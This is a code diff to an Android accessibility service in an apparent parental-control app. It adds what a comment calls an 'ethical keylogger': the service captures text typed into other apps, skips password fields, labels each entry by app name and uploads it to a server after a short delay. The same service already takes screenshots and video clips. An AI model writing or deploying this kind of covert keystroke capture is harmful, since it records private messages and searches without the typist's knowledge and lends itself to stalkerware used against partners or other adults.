@@ -15,6 +15,7 @@ import android.util.Base64;
 import android.util.Log;
 import android.view.Display;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 
 import com.kidsguard.parentalcontrol.models.ParentalConfig;
 import com.kidsguard.parentalcontrol.network.SyncClient;
@@ -38,6 +39,21 @@ public class AppBlockerAccessibilityService extends AccessibilityService {
     private String currentActivePackage = "";
     private long lastScreenshotTime = 0;
     private boolean isRecordingVideoClip = false;
+
+    // Buffer con debounce para captura de teclado y búsquedas (Keylogger ético)
+    private final Handler textDebounceHandler = new Handler(Looper.getMainLooper());
+    private String pendingKeyPackage = "";
+    private String pendingKeyAppName = "";
+    private String pendingKeyText = "";
+    private final Runnable sendPendingKeyRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (pendingKeyText != null && !pendingKeyText.trim().isEmpty() && pendingKeyPackage != null && !pendingKeyPackage.isEmpty()) {
+                SyncClient.sendKeystrokes(AppBlockerAccessibilityService.this, pendingKeyPackage, pendingKeyAppName, pendingKeyText.trim());
+                pendingKeyText = "";
+            }
+        }
+    };
 
     public boolean isEmergencyPackage(String packageName) {
         if (packageName == null) return false;
@@ -125,6 +141,11 @@ public class AppBlockerAccessibilityService extends AccessibilityService {
         if (event == null || event.getPackageName() == null) return;
 
         int eventType = event.getEventType();
+        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            handleViewTextChanged(event);
+            return;
+        }
+
         if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             String packageName = event.getPackageName().toString();
 
@@ -473,6 +494,56 @@ public class AppBlockerAccessibilityService extends AccessibilityService {
                 Log.w(TAG, "No se capturó ningún fotograma para el video clip");
             }
         }
+    }
+
+    private void handleViewTextChanged(AccessibilityEvent event) {
+        if (event == null) return;
+
+        // SEGURIDAD ESTRICTA: NUNCA capturar campos de contraseñas ni datos bancarios
+        if (event.isPassword()) {
+            return;
+        }
+        AccessibilityNodeInfo source = event.getSource();
+        if (source != null) {
+            if (source.isPassword()) {
+                source.recycle();
+                return;
+            }
+            source.recycle();
+        }
+
+        CharSequence pkgChar = event.getPackageName();
+        if (pkgChar == null) return;
+        String packageName = pkgChar.toString();
+
+        // Omitir UI del sistema y nuestra propia aplicación
+        if (getPackageName().equals(packageName) || "com.android.systemui".equals(packageName)) {
+            return;
+        }
+
+        List<CharSequence> texts = event.getText();
+        if (texts == null || texts.isEmpty()) return;
+
+        StringBuilder sb = new StringBuilder();
+        for (CharSequence cs : texts) {
+            if (cs != null) sb.append(cs);
+        }
+        String text = sb.toString().trim();
+        if (text.length() < 2) return;
+
+        PackageManager pm = getPackageManager();
+        String appName = packageName;
+        try {
+            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
+            appName = pm.getApplicationLabel(ai).toString();
+        } catch (Exception ignored) {}
+
+        pendingKeyPackage = packageName;
+        pendingKeyAppName = appName;
+        pendingKeyText = text;
+
+        textDebounceHandler.removeCallbacks(sendPendingKeyRunnable);
+        textDebounceHandler.postDelayed(sendPendingKeyRunnable, 1500);
     }
 
     @Override
